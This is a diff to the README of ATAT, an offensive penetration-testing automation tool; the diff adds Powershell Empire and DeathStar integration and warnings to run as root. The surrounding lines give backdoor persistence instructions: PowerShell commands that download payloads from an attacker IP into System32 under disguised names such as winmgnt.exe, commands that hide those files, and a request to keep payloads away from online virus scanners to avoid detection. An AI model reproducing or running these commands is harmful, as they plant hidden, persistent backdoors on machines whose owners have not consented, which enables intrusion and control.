@@ -2,7 +2,8 @@
 # ATAT
 Attack Team Automation Tool for automating penetration testing operations. Based on ezsploit by rand0m1ze. Durandal backdoor builder created by Travis Weathers (Skysploit).
 
-v1.7.1
+v1.8
+Added Powershell Empire & DeathStar Integration,
 Added support for Apache Struts/Tomcat/Etc. exploits,
 Added support for Java JMX exploitation,
 Added support for Java RMI exploitation,
@@ -123,6 +124,7 @@ OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE
 
 OPTION Dependency Checker:
 Dependencies option will attempt to install the required dependencies for ATAT. DBD Installer option must be run on your attacker box in order to receive DBD reverse shells.
+Powershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!
 
 OPTION Persistence:
 PLEASE DO NOT submit payloads generated to virustotal or any other online scanner!!
@@ -133,6 +135,7 @@ ATAT creates a taskmgnt.txt & winmgnt.txt for Windows DBD builder option payload
 Windows deployment instructions for reboot persistence:
 Now move the "taskmgnt.txt" & "winmgnt.txt" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec.
 While this backdoor is self healing; it will not auto start at reboot. To get your shell back after a reboot, enter the following on the target (one command per line):
+
 powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')
 powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\taskmgnt.exe')
 attrib +H +S \"%WINDIR%\System32\winmgnt.exe\"
@@ -150,3 +153,8 @@ Launch your listener with menu option 2. ATAT will intelligently detect the appr
 
 METHOD 2:
 This will be updated once the aforementioned feature has been fixed by Rapid7.
+
+OPTION: Powershell Empire:
+THIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!!
+IF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!!
+Empire & DeathStar MUST be installed in /root/!!
